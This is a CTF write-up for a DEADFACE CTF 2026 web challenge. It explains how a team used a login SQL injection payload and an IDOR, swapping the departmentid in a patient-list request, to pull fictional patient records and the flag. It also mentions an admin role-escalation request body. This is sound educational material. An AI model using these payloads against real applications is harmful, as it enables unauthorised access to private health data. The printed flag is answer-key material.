---
title: Real Pain in the Prostate
tags:
  - DEADFACE CTF 2026
  - Web
---

# Real Pain in the Prostate (2 of 4)

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Web |
| **Author** | @RP-01 |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> We are in the Health Spark application from **Doctor Appointment** at http://45.79.200.170:3000/, great work! Now let's see if we can get some access to data we shouldn't be able to see! Note: This IP address is hosting other ports for other challenges, only the website is relevant to this challenge.
>
> NOTE: Do not perform port scanning on this host, only the address and port discovered in OSINT matter.
>
> Submit the flag as: `deadface{flag-text}`

## Solution

### Where we started

From [Doctor Appointment](doctor-appointment.md) we had `john.smith` / `Locked_In_And_Ready`. His JWT has `departmentid` 10685, his employer. The member list comes from `POST /api/patients`, and that endpoint takes the department in the request body.

### Finding another department

The login SQLi from part 1 still works. Asking for any user outside our department gets us someone from another company:

```http
POST /api/login
{"username": "' OR departmentid<>10685-- ", "password": "x"}
```

That leaked `devon.pearce` and `maria.holloway`, both in department **18432**.

### The IDOR

`/api/patients` uses the `departmentid` from the body and never checks it against the token:

```http
POST /api/patients
Authorization: Bearer <john.smith token>
{"departmentid": 18432}
```

We got all 10 members of the other employer. One of them is "Patient Zero", with the flag in the diagnosis field:

```
Naomi Schwartz :: Coronary artery disease :: Spark Premier PPO
Felix Duarte   :: Chronic kidney disease, stage 3 :: Spark Premier PPO
Patient Zero   :: deadface{hipaa_exposure_is_bad} :: Spark Premier PPO
...
```

!!! warning "Red herring"
    The admin escalation (`POST /api/profile {"role":"admin"}`) and the photo-importer SSRF are real bugs, but they belong to [I Want to be a Real Boy](i-want-to-be-a-real-boy.md) (part 4). We lost hours using the SSRF to hunt for an "internal reporting port" on this one.

## Flag

!!! flag "Flag"
    `deadface{hipaa_exposure_is_bad}`

## Takeaways

When an API takes a tenant or department ID in the body, swap in a different one first. The earlier injection was how we found out which other IDs existed.
